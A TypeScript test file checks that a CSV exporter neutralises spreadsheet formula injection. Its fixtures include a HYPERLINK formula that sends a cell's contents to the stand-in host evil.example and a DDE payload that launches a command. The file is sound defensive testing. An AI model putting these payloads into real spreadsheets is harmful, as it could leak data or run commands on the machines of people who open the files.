import { describe, expect, it } from 'vitest'
import { csvOf } from '../src/client/take-away.ts'

// The list of what to fix leaves as a csv a spreadsheet opens, and part of
// what is in it came from a workbook somebody else wrote.

describe('the list of what to fix, as a file', () => {
  it('keeps a cell that opens like a formula from being read as one', () => {
    const text = csvOf([
      ['行号', '问题'],
      ['第 3 行', '=HYPERLINK("http://evil.example/?"&A2,"点此") 已存在'],
      ['文件', "+cmd|' /C calc'!A0"],
      ['文件', '-2+3'],
      ['文件', '@SUM(1,1)'],
      ['文件', '\t=1+1'],
      ['文件', '\r=1+1'],
    ])
    expect(text.split('\r\n')).toEqual([
      '"行号","问题"',
      '"第 3 行","\'=HYPERLINK(""http://evil.example/?""&A2,""点此"") 已存在"',
      '"文件","\'+cmd|\' /C calc\'!A0"',
      '"文件","\'-2+3"',
      '"文件","\'@SUM(1,1)"',
      '"文件","\'\t=1+1"',
      '"文件","\'\r=1+1"',
    ])
  })

  it('leaves an ordinary cell as it was written', () => {
    expect(csvOf([['示例大学 / 软件学院', '学号为空', '']])).toBe(
      '"示例大学 / 软件学院","学号为空",""',
    )
  })
})
